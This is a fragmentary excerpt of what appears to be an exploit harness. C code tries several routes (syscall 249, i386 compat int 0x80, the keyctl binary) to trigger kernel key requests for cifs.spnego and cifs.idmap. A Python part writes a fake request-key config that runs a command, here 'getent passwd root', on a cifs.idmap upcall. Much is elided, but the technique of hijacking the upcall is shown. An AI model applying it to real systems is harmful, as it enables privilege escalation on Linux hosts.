...
int main(int argc, char **argv)
{
        ...
        fprintf(stderr, "\n[A] cifs.spnego via syscall(249)...\n");
        errno = 0;
        ret = do_request_key("cifs.spnego", desc);
        fprintf(stderr, "    rc=%ld errno=%d (%s)\n", ret, errno, strerror(errno));

        if (ret < 0) {
                fprintf(stderr, "[B] cifs.spnego via int 0x80 (i386 compat)...\n");
                errno = 0;
                ret = do_request_key_i386("cifs.spnego", desc);
                fprintf(stderr, "    rc=%ld errno=%d (%s)\n", ret, errno, strerror(errno));
        }

        if (ret < 0) {
                fprintf(stderr, "[C] cifs.spnego via keyctl binary...\n");
                ret = do_request_key_exec("cifs.spnego", desc);
                fprintf(stderr, "    rc=%ld\n", ret);
        }

        if (ret < 0) {
                fprintf(stderr, "[D] cifs.idmap via syscall(249)...\n");
                errno = 0;
        ...
        if (ret < 0) {
                fprintf(stderr, "[E] cifs.idmap via int 0x80...\n");
                errno = 0;
                ret = do_request_key_i386("cifs.idmap", "ci:0");
                fprintf(stderr, "    rc=%ld errno=%d (%s)\n", ret, errno, strerror(errno));
        }
...
def main() -> None:
    ...
    write_text(
        FAKE_REQKEY,
        """
        create cifs.idmap  * * /usr/bin/getent passwd root
